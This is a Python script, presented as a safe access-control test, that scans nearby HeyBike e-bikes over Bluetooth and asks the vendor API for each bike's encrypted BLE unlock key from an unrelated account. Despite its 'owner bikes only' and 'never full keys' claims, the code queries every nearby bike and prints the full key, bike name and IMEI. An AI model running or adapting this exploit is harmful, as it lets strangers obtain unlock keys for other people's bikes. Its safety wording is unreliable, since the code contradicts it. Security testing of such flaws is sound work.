#!/usr/bin/env python3

from __future__ import annotations

import argparse
import asyncio
import getpass
import sys

from heybike_power import (
    AccountBike,
    NearbyHeybike,
    ProtocolError,
    api_bike_by_ble_mac,
    api_login,
    api_user_bikes,
    choose_account_bike,
    iter_nearby_heybikes,
    compact_mac,
)


def account_token(label: str, email: str | None, password: str | None, token: str | None) -> str:
    if token:
        return token
    if not email:
        raise ProtocolError(f"provide --{label}-email or --{label}-token")
    if password is None:
        password = getpass.getpass(f"HeyBike password for {label} account {email}: ")
    print(f"Logging in as {label} account...")
    return api_login(email, password)


def describe_bytes_map(value: dict[object, bytes]) -> str:
    if not value:
        return ""
    parts = []
    for key, data in value.items():
        if isinstance(key, int):
            label = f"0x{key:04X}"
        else:
            label = str(key)
        parts.append(f"{label}:{data.hex()}")
    return ", ".join(parts)


def describe_advertisement(device: NearbyHeybike) -> str:
    parts = [
        f"mac={device.mac}",
        f"name={device.name or '(blank)'}",
    ]
    if device.rssi is not None:
        parts.append(f"rssi={device.rssi}")
    if device.tx_power is not None:
        parts.append(f"tx_power={device.tx_power}")
    if device.service_uuids:
        parts.append(f"services={','.join(device.service_uuids)}")
    manufacturer_data = describe_bytes_map(device.manufacturer_data)
    if manufacturer_data:
        parts.append(f"manufacturer_data={manufacturer_data}")
    service_data = describe_bytes_map(device.service_data)
    if service_data:
        parts.append(f"service_data={service_data}")
    return "  ".join(parts)


def describe_account_bike(bike: AccountBike) -> str:
    parts = [bike.name, bike.mac]
    if bike.imei:
        parts.append(f"IMEI {bike.imei}")
    return "  ".join(parts)


def selected_owner_bikes(args: argparse.Namespace, bikes: list[AccountBike]) -> list[AccountBike]:
    if args.bike_index is None and not args.bike_name and not args.bike_mac:
        return bikes
    return [
        choose_account_bike(
            bikes,
            requested_mac=args.bike_mac,
            requested_name=args.bike_name,
            requested_index=args.bike_index,
            non_interactive=args.non_interactive,
        )
    ]


async def main() -> int:
    parser = argparse.ArgumentParser(
        description=(
            "Safely test whether a second HeyBike account can fetch the BLE key "
            "for nearby bikes that are known by your owner account."
        )
    )
    parser.add_argument("--email", help="Email for an unassociated test account.")
    parser.add_argument("--password", help="Test account password. Omit to prompt.")
    parser.add_argument("--token", help="Existing API token for the test account.")
    parser.add_argument("--scan-seconds", type=float, default=20.0)
    parser.add_argument("--non-interactive", action="store_true")
    parser.add_argument(
        "--show-key-fingerprint",
        action="store_true",
        help="Print short encrypted-key fingerprints, never full keys.",
    )
    args = parser.parse_args()

    try:
        test_token = account_token("test", args.email, args.password, args.token)

        print(f"Scanning {args.scan_seconds:.1f}s for nearby Heybike advertisements...")
        async for found in iter_nearby_heybikes(scan_seconds=args.scan_seconds):
            print(f"Found Heybike advertisement: {describe_advertisement(found)}")

            print("Calling getBikeByBleMac from the unassociated test account...")
            try:
                leaked = api_bike_by_ble_mac(test_token, found.mac)
            except ProtocolError as exc:
                print(f"PASS: test account did not receive a BLE key ({exc}).")
                continue

            if not leaked.encrypted_ble_key:
                print("PASS: endpoint returned no BLE key.")
                continue

            print("FAIL: unassociated test account received a BLE key for the owned bike.")
            print("This is a server-side access-control issue if the test account is truly unaffiliated.")
            print(f"Endpoint bike name: {leaked.name}")
            if leaked.imei:
                print(f"Endpoint IMEI: {leaked.imei}")
            print(f"Test  key fingerprint: {leaked.encrypted_ble_key}")

        return 0
    except KeyboardInterrupt:
        return 130
    except Exception as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
